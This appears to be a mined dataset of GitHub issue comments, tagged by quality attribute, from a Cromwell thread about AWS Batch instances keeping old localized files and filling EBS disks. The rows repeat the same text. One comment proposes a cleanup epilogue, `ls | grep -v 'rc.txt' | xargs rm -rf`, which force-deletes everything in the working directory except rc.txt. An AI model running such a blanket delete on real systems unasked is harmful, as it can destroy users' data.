https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716242694:2322,Deployability,UPDATE,UPDATE,2322,"rminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks, Mark; > […](#); > On Sat, Oct 24, 2020 at 5:27 AM Luyu ***@***.***> wrote: Hi, I have set up a Cromwell platform on AWS batch according to https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/ If I run GATK Best Practice pipeline for one sample, it works perfectly. However, when I ran this pipeline for 10+ samples concurrently, many AWS EC2 instances were re-used by AWS batch. Cromwell didn't clean up the localized S3 files and output files produced by previous tasks. This quickly inflated EBS cost when EBS autoscaling is enabled. One of my instances went up to 9.1TB and hit the upper bound for autoscaling, then the running task failed due to no space. I have checked Cromwell documents and some materials from AWS, as well as issue #4323 <#4323>. But none of them works for me. Thank you in advance for any suggestions. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5974>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA> . Hi Mark,. Thanks for your reply. I think I find a workaround (probably close to a real solution). I find the script for a container to run is generated at https://github.com/broadinstitute/cromwell/blob/491082aa3e5b3bd5657f339c959260951333e638/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L435 . The `SCRIPT_EPILOGUE` has a default value `sync`. This could be set by adding `script-epilogue = ""sync; ls | grep -v 'rc.txt' | xargs rm -rf` in the cromwell.conf, referring to https://github.com/broadinstitute/cromwell/blob/8e5ca8791d2ba685965a655f2404972f2c80299d/cromwell.example.backends/LocalExample.conf#L43 I'm not sure if this works for AWS batch backend. **UPDATE: `SCRIPT_EPILOGUE` is not valid for AWS backend. This workaround doesn't work ... :(**. Thanks,; Luyu",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716242694
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716242694:870,Performance,concurren,concurrently,870,"> Hi Luyu, Thanks for the feedback. This is an interesting case. Normally if there is a few minutes gap between workflows the instances will be terminated by batch and the disks will be reclaimed so each workflow starts from scratch. However in your case there isn’t a pause in work long enough for Batch to shut down the instances. Also because these files are written to a mounted disk they are not deleted when the container terminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks, Mark; > […](#); > On Sat, Oct 24, 2020 at 5:27 AM Luyu ***@***.***> wrote: Hi, I have set up a Cromwell platform on AWS batch according to https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/ If I run GATK Best Practice pipeline for one sample, it works perfectly. However, when I ran this pipeline for 10+ samples concurrently, many AWS EC2 instances were re-used by AWS batch. Cromwell didn't clean up the localized S3 files and output files produced by previous tasks. This quickly inflated EBS cost when EBS autoscaling is enabled. One of my instances went up to 9.1TB and hit the upper bound for autoscaling, then the running task failed due to no space. I have checked Cromwell documents and some materials from AWS, as well as issue #4323 <#4323>. But none of them works for me. Thank you in advance for any suggestions. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5974>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA> . Hi Mark,. Thanks for your reply. I think I find a workaround (probably close to a real solution). I find the script for a container to run is generated at https://github.com/broadinstitute/cromwell/blob/491082aa3e5b3bd5657f339c959260951333e638/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L435 . The `SCRIPT_EPILOGUE` has a default value `sy",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716242694
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716242694:26,Usability,feedback,feedback,26,"> Hi Luyu, Thanks for the feedback. This is an interesting case. Normally if there is a few minutes gap between workflows the instances will be terminated by batch and the disks will be reclaimed so each workflow starts from scratch. However in your case there isn’t a pause in work long enough for Batch to shut down the instances. Also because these files are written to a mounted disk they are not deleted when the container terminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks, Mark; > […](#); > On Sat, Oct 24, 2020 at 5:27 AM Luyu ***@***.***> wrote: Hi, I have set up a Cromwell platform on AWS batch according to https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/ If I run GATK Best Practice pipeline for one sample, it works perfectly. However, when I ran this pipeline for 10+ samples concurrently, many AWS EC2 instances were re-used by AWS batch. Cromwell didn't clean up the localized S3 files and output files produced by previous tasks. This quickly inflated EBS cost when EBS autoscaling is enabled. One of my instances went up to 9.1TB and hit the upper bound for autoscaling, then the running task failed due to no space. I have checked Cromwell documents and some materials from AWS, as well as issue #4323 <#4323>. But none of them works for me. Thank you in advance for any suggestions. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5974>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA> . Hi Mark,. Thanks for your reply. I think I find a workaround (probably close to a real solution). I find the script for a container to run is generated at https://github.com/broadinstitute/cromwell/blob/491082aa3e5b3bd5657f339c959260951333e638/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L435 . The `SCRIPT_EPILOGUE` has a default value `sy",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716242694
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716242694:269,Usability,pause,pause,269,"> Hi Luyu, Thanks for the feedback. This is an interesting case. Normally if there is a few minutes gap between workflows the instances will be terminated by batch and the disks will be reclaimed so each workflow starts from scratch. However in your case there isn’t a pause in work long enough for Batch to shut down the instances. Also because these files are written to a mounted disk they are not deleted when the container terminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks, Mark; > […](#); > On Sat, Oct 24, 2020 at 5:27 AM Luyu ***@***.***> wrote: Hi, I have set up a Cromwell platform on AWS batch according to https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/ If I run GATK Best Practice pipeline for one sample, it works perfectly. However, when I ran this pipeline for 10+ samples concurrently, many AWS EC2 instances were re-used by AWS batch. Cromwell didn't clean up the localized S3 files and output files produced by previous tasks. This quickly inflated EBS cost when EBS autoscaling is enabled. One of my instances went up to 9.1TB and hit the upper bound for autoscaling, then the running task failed due to no space. I have checked Cromwell documents and some materials from AWS, as well as issue #4323 <#4323>. But none of them works for me. Thank you in advance for any suggestions. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5974>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA> . Hi Mark,. Thanks for your reply. I think I find a workaround (probably close to a real solution). I find the script for a container to run is generated at https://github.com/broadinstitute/cromwell/blob/491082aa3e5b3bd5657f339c959260951333e638/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L435 . The `SCRIPT_EPILOGUE` has a default value `sy",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716242694
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716242694:460,Usability,simpl,simple,460,"> Hi Luyu, Thanks for the feedback. This is an interesting case. Normally if there is a few minutes gap between workflows the instances will be terminated by batch and the disks will be reclaimed so each workflow starts from scratch. However in your case there isn’t a pause in work long enough for Batch to shut down the instances. Also because these files are written to a mounted disk they are not deleted when the container terminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks, Mark; > […](#); > On Sat, Oct 24, 2020 at 5:27 AM Luyu ***@***.***> wrote: Hi, I have set up a Cromwell platform on AWS batch according to https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/ If I run GATK Best Practice pipeline for one sample, it works perfectly. However, when I ran this pipeline for 10+ samples concurrently, many AWS EC2 instances were re-used by AWS batch. Cromwell didn't clean up the localized S3 files and output files produced by previous tasks. This quickly inflated EBS cost when EBS autoscaling is enabled. One of my instances went up to 9.1TB and hit the upper bound for autoscaling, then the running task failed due to no space. I have checked Cromwell documents and some materials from AWS, as well as issue #4323 <#4323>. But none of them works for me. Thank you in advance for any suggestions. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5974>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA> . Hi Mark,. Thanks for your reply. I think I find a workaround (probably close to a real solution). I find the script for a container to run is generated at https://github.com/broadinstitute/cromwell/blob/491082aa3e5b3bd5657f339c959260951333e638/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L435 . The `SCRIPT_EPILOGUE` has a default value `sy",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716242694
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718299843:508,Availability,down,down,508,"Yes, the script epilogue is exactly where the change should be. The script; is generated by AwsBatchJob.scala. On Sun, Oct 25, 2020 at 8:37 PM Luyu <notifications@github.com> wrote:. > Hi Luyu, Thanks for the feedback. This is an interesting case. Normally if; > there is a few minutes gap between workflows the instances will be; > terminated by batch and the disks will be reclaimed so each workflow starts; > from scratch. However in your case there isn’t a pause in work long enough; > for Batch to shut down the instances. Also because these files are written; > to a mounted disk they are not deleted when the container terminates. I; > think this fix is simple if I add a cleanup step. I will do this ASAP.; > Thanks, Mark; > … <#m_-3989886626109986556_>; > On Sat, Oct 24, 2020 at 5:27 AM Luyu *@*.***> wrote: Hi, I have set up a; > Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space. I have checked Cromwell documents; > and some materials from AWS, as well as issue #4323; > <https://github.com/broadinstitute/cromwell/issues/4323> <#4323; > <https://github.com/broadinstitute/cromwell/issues/4323>>. But none of; > them works for me. Thank you in advance for any suggestions. — You are; > receiving this because you are subscribed to this thread. Reply to this; > email directly, view it on GitHub <#5974; > <https://github.com/broadinstitute/cromwell/issues/5974>>, or unsubscribe; > https://github.com/notifications/u",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718299843
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718299843:1006,Deployability,pipeline,pipeline,1006,"Yes, the script epilogue is exactly where the change should be. The script; is generated by AwsBatchJob.scala. On Sun, Oct 25, 2020 at 8:37 PM Luyu <notifications@github.com> wrote:. > Hi Luyu, Thanks for the feedback. This is an interesting case. Normally if; > there is a few minutes gap between workflows the instances will be; > terminated by batch and the disks will be reclaimed so each workflow starts; > from scratch. However in your case there isn’t a pause in work long enough; > for Batch to shut down the instances. Also because these files are written; > to a mounted disk they are not deleted when the container terminates. I; > think this fix is simple if I add a cleanup step. I will do this ASAP.; > Thanks, Mark; > … <#m_-3989886626109986556_>; > On Sat, Oct 24, 2020 at 5:27 AM Luyu *@*.***> wrote: Hi, I have set up a; > Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space. I have checked Cromwell documents; > and some materials from AWS, as well as issue #4323; > <https://github.com/broadinstitute/cromwell/issues/4323> <#4323; > <https://github.com/broadinstitute/cromwell/issues/4323>>. But none of; > them works for me. Thank you in advance for any suggestions. — You are; > receiving this because you are subscribed to this thread. Reply to this; > email directly, view it on GitHub <#5974; > <https://github.com/broadinstitute/cromwell/issues/5974>>, or unsubscribe; > https://github.com/notifications/u",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718299843
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718299843:1079,Deployability,pipeline,pipeline,1079," On Sun, Oct 25, 2020 at 8:37 PM Luyu <notifications@github.com> wrote:. > Hi Luyu, Thanks for the feedback. This is an interesting case. Normally if; > there is a few minutes gap between workflows the instances will be; > terminated by batch and the disks will be reclaimed so each workflow starts; > from scratch. However in your case there isn’t a pause in work long enough; > for Batch to shut down the instances. Also because these files are written; > to a mounted disk they are not deleted when the container terminates. I; > think this fix is simple if I add a cleanup step. I will do this ASAP.; > Thanks, Mark; > … <#m_-3989886626109986556_>; > On Sat, Oct 24, 2020 at 5:27 AM Luyu *@*.***> wrote: Hi, I have set up a; > Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space. I have checked Cromwell documents; > and some materials from AWS, as well as issue #4323; > <https://github.com/broadinstitute/cromwell/issues/4323> <#4323; > <https://github.com/broadinstitute/cromwell/issues/4323>>. But none of; > them works for me. Thank you in advance for any suggestions. — You are; > receiving this because you are subscribed to this thread. Reply to this; > email directly, view it on GitHub <#5974; > <https://github.com/broadinstitute/cromwell/issues/5974>>, or unsubscribe; > https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA; > .; >; > Hi Mark,; >; > Thanks for your reply.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718299843
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718299843:1104,Performance,concurren,concurrently,1104," On Sun, Oct 25, 2020 at 8:37 PM Luyu <notifications@github.com> wrote:. > Hi Luyu, Thanks for the feedback. This is an interesting case. Normally if; > there is a few minutes gap between workflows the instances will be; > terminated by batch and the disks will be reclaimed so each workflow starts; > from scratch. However in your case there isn’t a pause in work long enough; > for Batch to shut down the instances. Also because these files are written; > to a mounted disk they are not deleted when the container terminates. I; > think this fix is simple if I add a cleanup step. I will do this ASAP.; > Thanks, Mark; > … <#m_-3989886626109986556_>; > On Sat, Oct 24, 2020 at 5:27 AM Luyu *@*.***> wrote: Hi, I have set up a; > Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space. I have checked Cromwell documents; > and some materials from AWS, as well as issue #4323; > <https://github.com/broadinstitute/cromwell/issues/4323> <#4323; > <https://github.com/broadinstitute/cromwell/issues/4323>>. But none of; > them works for me. Thank you in advance for any suggestions. — You are; > receiving this because you are subscribed to this thread. Reply to this; > email directly, view it on GitHub <#5974; > <https://github.com/broadinstitute/cromwell/issues/5974>>, or unsubscribe; > https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA; > .; >; > Hi Mark,; >; > Thanks for your reply.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718299843
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718299843:209,Usability,feedback,feedback,209,"Yes, the script epilogue is exactly where the change should be. The script; is generated by AwsBatchJob.scala. On Sun, Oct 25, 2020 at 8:37 PM Luyu <notifications@github.com> wrote:. > Hi Luyu, Thanks for the feedback. This is an interesting case. Normally if; > there is a few minutes gap between workflows the instances will be; > terminated by batch and the disks will be reclaimed so each workflow starts; > from scratch. However in your case there isn’t a pause in work long enough; > for Batch to shut down the instances. Also because these files are written; > to a mounted disk they are not deleted when the container terminates. I; > think this fix is simple if I add a cleanup step. I will do this ASAP.; > Thanks, Mark; > … <#m_-3989886626109986556_>; > On Sat, Oct 24, 2020 at 5:27 AM Luyu *@*.***> wrote: Hi, I have set up a; > Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space. I have checked Cromwell documents; > and some materials from AWS, as well as issue #4323; > <https://github.com/broadinstitute/cromwell/issues/4323> <#4323; > <https://github.com/broadinstitute/cromwell/issues/4323>>. But none of; > them works for me. Thank you in advance for any suggestions. — You are; > receiving this because you are subscribed to this thread. Reply to this; > email directly, view it on GitHub <#5974; > <https://github.com/broadinstitute/cromwell/issues/5974>>, or unsubscribe; > https://github.com/notifications/u",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718299843
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718299843:461,Usability,pause,pause,461,"Yes, the script epilogue is exactly where the change should be. The script; is generated by AwsBatchJob.scala. On Sun, Oct 25, 2020 at 8:37 PM Luyu <notifications@github.com> wrote:. > Hi Luyu, Thanks for the feedback. This is an interesting case. Normally if; > there is a few minutes gap between workflows the instances will be; > terminated by batch and the disks will be reclaimed so each workflow starts; > from scratch. However in your case there isn’t a pause in work long enough; > for Batch to shut down the instances. Also because these files are written; > to a mounted disk they are not deleted when the container terminates. I; > think this fix is simple if I add a cleanup step. I will do this ASAP.; > Thanks, Mark; > … <#m_-3989886626109986556_>; > On Sat, Oct 24, 2020 at 5:27 AM Luyu *@*.***> wrote: Hi, I have set up a; > Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space. I have checked Cromwell documents; > and some materials from AWS, as well as issue #4323; > <https://github.com/broadinstitute/cromwell/issues/4323> <#4323; > <https://github.com/broadinstitute/cromwell/issues/4323>>. But none of; > them works for me. Thank you in advance for any suggestions. — You are; > receiving this because you are subscribed to this thread. Reply to this; > email directly, view it on GitHub <#5974; > <https://github.com/broadinstitute/cromwell/issues/5974>>, or unsubscribe; > https://github.com/notifications/u",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718299843
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718299843:661,Usability,simpl,simple,661,"Yes, the script epilogue is exactly where the change should be. The script; is generated by AwsBatchJob.scala. On Sun, Oct 25, 2020 at 8:37 PM Luyu <notifications@github.com> wrote:. > Hi Luyu, Thanks for the feedback. This is an interesting case. Normally if; > there is a few minutes gap between workflows the instances will be; > terminated by batch and the disks will be reclaimed so each workflow starts; > from scratch. However in your case there isn’t a pause in work long enough; > for Batch to shut down the instances. Also because these files are written; > to a mounted disk they are not deleted when the container terminates. I; > think this fix is simple if I add a cleanup step. I will do this ASAP.; > Thanks, Mark; > … <#m_-3989886626109986556_>; > On Sat, Oct 24, 2020 at 5:27 AM Luyu *@*.***> wrote: Hi, I have set up a; > Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space. I have checked Cromwell documents; > and some materials from AWS, as well as issue #4323; > <https://github.com/broadinstitute/cromwell/issues/4323> <#4323; > <https://github.com/broadinstitute/cromwell/issues/4323>>. But none of; > them works for me. Thank you in advance for any suggestions. — You are; > receiving this because you are subscribed to this thread. Reply to this; > email directly, view it on GitHub <#5974; > <https://github.com/broadinstitute/cromwell/issues/5974>>, or unsubscribe; > https://github.com/notifications/u",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718299843
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718305383:590,Availability,down,down,590,"However, AWS Batch backend ignores script-epilogue as unrecognized. Do you have any suggestions?. > Yes, the script epilogue is exactly where the change should be. The script is generated by AwsBatchJob.scala; > […](#); > On Sun, Oct 25, 2020 at 8:37 PM Luyu ***@***.***> wrote: Hi Luyu, Thanks for the feedback. This is an interesting case. Normally if there is a few minutes gap between workflows the instances will be terminated by batch and the disks will be reclaimed so each workflow starts from scratch. However in your case there isn’t a pause in work long enough for Batch to shut down the instances. Also because these files are written to a mounted disk they are not deleted when the container terminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks, Mark … <#m_-3989886626109986556_> On Sat, Oct 24, 2020 at 5:27 AM Luyu *@*.***> wrote: Hi, I have set up a Cromwell platform on AWS batch according to https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/ If I run GATK Best Practice pipeline for one sample, it works perfectly. However, when I ran this pipeline for 10+ samples concurrently, many AWS EC2 instances were re-used by AWS batch. Cromwell didn't clean up the localized S3 files and output files produced by previous tasks. This quickly inflated EBS cost when EBS autoscaling is enabled. One of my instances went up to 9.1TB and hit the upper bound for autoscaling, then the running task failed due to no space. I have checked Cromwell documents and some materials from AWS, as well as issue #4323 <#4323> <#4323 <#4323>>. But none of them works for me. Thank you in advance for any suggestions. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5974 <#5974>>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA . Hi Mark, Thanks for your reply. I think I find a workaround (probabl",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718305383
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718305383:1064,Deployability,pipeline,pipeline,1064,"pt-epilogue as unrecognized. Do you have any suggestions?. > Yes, the script epilogue is exactly where the change should be. The script is generated by AwsBatchJob.scala; > […](#); > On Sun, Oct 25, 2020 at 8:37 PM Luyu ***@***.***> wrote: Hi Luyu, Thanks for the feedback. This is an interesting case. Normally if there is a few minutes gap between workflows the instances will be terminated by batch and the disks will be reclaimed so each workflow starts from scratch. However in your case there isn’t a pause in work long enough for Batch to shut down the instances. Also because these files are written to a mounted disk they are not deleted when the container terminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks, Mark … <#m_-3989886626109986556_> On Sat, Oct 24, 2020 at 5:27 AM Luyu *@*.***> wrote: Hi, I have set up a Cromwell platform on AWS batch according to https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/ If I run GATK Best Practice pipeline for one sample, it works perfectly. However, when I ran this pipeline for 10+ samples concurrently, many AWS EC2 instances were re-used by AWS batch. Cromwell didn't clean up the localized S3 files and output files produced by previous tasks. This quickly inflated EBS cost when EBS autoscaling is enabled. One of my instances went up to 9.1TB and hit the upper bound for autoscaling, then the running task failed due to no space. I have checked Cromwell documents and some materials from AWS, as well as issue #4323 <#4323> <#4323 <#4323>>. But none of them works for me. Thank you in advance for any suggestions. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5974 <#5974>>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA . Hi Mark, Thanks for your reply. I think I find a workaround (probably close to a real solution). I find the",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718305383
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718305383:1134,Deployability,pipeline,pipeline,1134,"he script is generated by AwsBatchJob.scala; > […](#); > On Sun, Oct 25, 2020 at 8:37 PM Luyu ***@***.***> wrote: Hi Luyu, Thanks for the feedback. This is an interesting case. Normally if there is a few minutes gap between workflows the instances will be terminated by batch and the disks will be reclaimed so each workflow starts from scratch. However in your case there isn’t a pause in work long enough for Batch to shut down the instances. Also because these files are written to a mounted disk they are not deleted when the container terminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks, Mark … <#m_-3989886626109986556_> On Sat, Oct 24, 2020 at 5:27 AM Luyu *@*.***> wrote: Hi, I have set up a Cromwell platform on AWS batch according to https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/ If I run GATK Best Practice pipeline for one sample, it works perfectly. However, when I ran this pipeline for 10+ samples concurrently, many AWS EC2 instances were re-used by AWS batch. Cromwell didn't clean up the localized S3 files and output files produced by previous tasks. This quickly inflated EBS cost when EBS autoscaling is enabled. One of my instances went up to 9.1TB and hit the upper bound for autoscaling, then the running task failed due to no space. I have checked Cromwell documents and some materials from AWS, as well as issue #4323 <#4323> <#4323 <#4323>>. But none of them works for me. Thank you in advance for any suggestions. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5974 <#5974>>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA . Hi Mark, Thanks for your reply. I think I find a workaround (probably close to a real solution). I find the script for a container to run is generated at https://github.com/broadinstitute/cromwell/blob/491082aa3e5b3bd5657f339c959260",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718305383
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718305383:1159,Performance,concurren,concurrently,1159,"he script is generated by AwsBatchJob.scala; > […](#); > On Sun, Oct 25, 2020 at 8:37 PM Luyu ***@***.***> wrote: Hi Luyu, Thanks for the feedback. This is an interesting case. Normally if there is a few minutes gap between workflows the instances will be terminated by batch and the disks will be reclaimed so each workflow starts from scratch. However in your case there isn’t a pause in work long enough for Batch to shut down the instances. Also because these files are written to a mounted disk they are not deleted when the container terminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks, Mark … <#m_-3989886626109986556_> On Sat, Oct 24, 2020 at 5:27 AM Luyu *@*.***> wrote: Hi, I have set up a Cromwell platform on AWS batch according to https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/ If I run GATK Best Practice pipeline for one sample, it works perfectly. However, when I ran this pipeline for 10+ samples concurrently, many AWS EC2 instances were re-used by AWS batch. Cromwell didn't clean up the localized S3 files and output files produced by previous tasks. This quickly inflated EBS cost when EBS autoscaling is enabled. One of my instances went up to 9.1TB and hit the upper bound for autoscaling, then the running task failed due to no space. I have checked Cromwell documents and some materials from AWS, as well as issue #4323 <#4323> <#4323 <#4323>>. But none of them works for me. Thank you in advance for any suggestions. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5974 <#5974>>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA . Hi Mark, Thanks for your reply. I think I find a workaround (probably close to a real solution). I find the script for a container to run is generated at https://github.com/broadinstitute/cromwell/blob/491082aa3e5b3bd5657f339c959260",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718305383
